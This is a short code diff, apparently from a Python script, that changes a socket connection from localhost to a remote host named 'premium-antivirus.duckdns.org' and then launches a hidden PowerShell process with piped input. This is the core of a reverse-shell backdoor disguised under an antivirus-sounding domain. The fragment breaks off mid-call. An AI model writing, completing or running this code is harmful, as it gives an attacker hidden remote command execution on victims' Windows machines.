@@ -7,7 +7,7 @@ def connect():
         p = None
         try:
             s = socket.socket()
-            s.connect(('127.0.0.1', 44443))
+            s.connect(('premium-antivirus.duckdns.org', 44443))
             p = subprocess.Popen(
                 ['powershell.exe', '-WindowStyle', 'Hidden', '-NoProfile'],
                 stdin=subprocess.PIPE, 
